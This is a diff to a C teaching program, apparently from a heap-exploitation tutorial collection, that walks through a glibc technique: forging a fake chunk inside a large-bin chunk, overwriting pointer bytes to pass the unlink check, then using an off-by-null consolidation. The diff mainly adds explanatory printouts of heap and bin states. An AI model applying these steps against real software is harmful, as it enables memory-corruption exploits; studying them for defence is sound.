@@ -49,12 +49,26 @@ int main()
 	puts("malloc(0x10) to avoid consolidation");
 	malloc(0x10);
 
+	puts("\nCurrent Heap Layout\n"
+		 "    ... ...\n"
+		 "padding\n"
+		 "    prev Chunk(addr=0x??0010, size=0x510)\n"
+     	 "  victim Chunk(addr=0x??0520, size=0x500)\n"
+		 " barrier Chunk(addr=0x??0a20, size=0x20)\n"
+		 "       a Chunk(addr=0x??0a40, size=0x500)\n"
+		 " barrier Chunk(addr=0x??0f40, size=0x20)\n"
+		 "       b Chunk(addr=0x??0f60, size=0x520)\n"
+		 " barrier Chunk(addr=0x??1480, size=0x20)\n");
+
 	puts("Now free a, b, prev");
 	free(a);
 	free(b);
 	free(prev);
+	puts("current unsorted_bin:  header <-> [prev, size=0x510] <-> [b, size=0x520] <-> [a, size=0x500]\n");
+
 	puts("Allocate a huge chunk to enable sorting");
 	malloc(0x1000);
+	puts("current large_bin:  header <-> [b, size=0x520] <-> [prev, size=0x510] <-> [a, size=0x500]\n");
 
 	puts("This will add a, b and prev to largebin\nNow prev is in largebin");
 	printf("The fd_nextsize of prev points to a: %p\n", ((void **)prev)[2]+0x10);
@@ -66,6 +80,7 @@ int main()
 	puts("we can allocate 0x500 as before to take prev out");
 	void *prev2 = malloc(0x500);
 	printf("prev2: malloc(0x500) = %p\n", prev2);
+	puts("Now prev2 == prev, prev2->fd == prev2->fd_nextsize == a, and prev2->bk == prev2->bk_nextsize == b");
 	assert(prev == prev2);
 
 	puts("The fake chunk is contained in prev and the size is smaller than prev's size by 0x10");
@@ -74,6 +89,8 @@ int main()
 	puts("And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check");
 	*(long *)(prev + 0x500) = 0x500;
 	printf("The fake chunk should be at: %p\n", prev + 0x10);
+	puts("use prev's fd_nextsize & bk_nextsize as fake_chunk's fd & bk");
+	puts("Now we have fake_chunk->fd == a and fake_chunk->bk == b");
 
 	// step5: bypass unlinking
 	puts("\nStep5: Manipulate residual pointers to bypass unlinking later.");
@@ -83,7 +100,7 @@ int main()
 	printf("We can overwrite the least significant two bytes to make it our fake chunk.\n"
 			"If the lowest 2nd byte is not \\x00, we need to guess what to write now\n");
 	((char*)b2)[0] = '\x10';
-	((char*)b2)[1] = '\x00';
+	((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk
 	printf("After the overwrite, b->fd is: %p, which is the chunk pointer to our fake chunk\n", ((void **)b2)[0]);
 
 	puts("To do the same to a, we can move it to unsorted bin first"
@@ -98,6 +115,15 @@ int main()
 	((char*)a3)[8] = '\x10';
 	((char*)a3)[9] = '\x00';
 	printf("After the overwrite, a->bck is: %p, which is the chunk pointer to our fake chunk\n", ((void **)a3)[1]);
+	// pass unlink_chunk in malloc.c:
+	//      mchunkptr fd = p->fd;
+	//      mchunkptr bk = p->bk;
+	//      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
+	//          malloc_printerr ("corrupted double-linked list");
+	puts("And we have:\n"
+		 "fake_chunk->fd->bk == a->bk == fake_chunk\n"
+		 "fake_chunk->bk->fd == b->fd == fake_chunk\n"
+		 );
 
 	// step6: add fake chunk into unsorted bin by off-by-null
 	puts("\nStep6: Use backward consolidation to add fake chunk into unsortedbin");
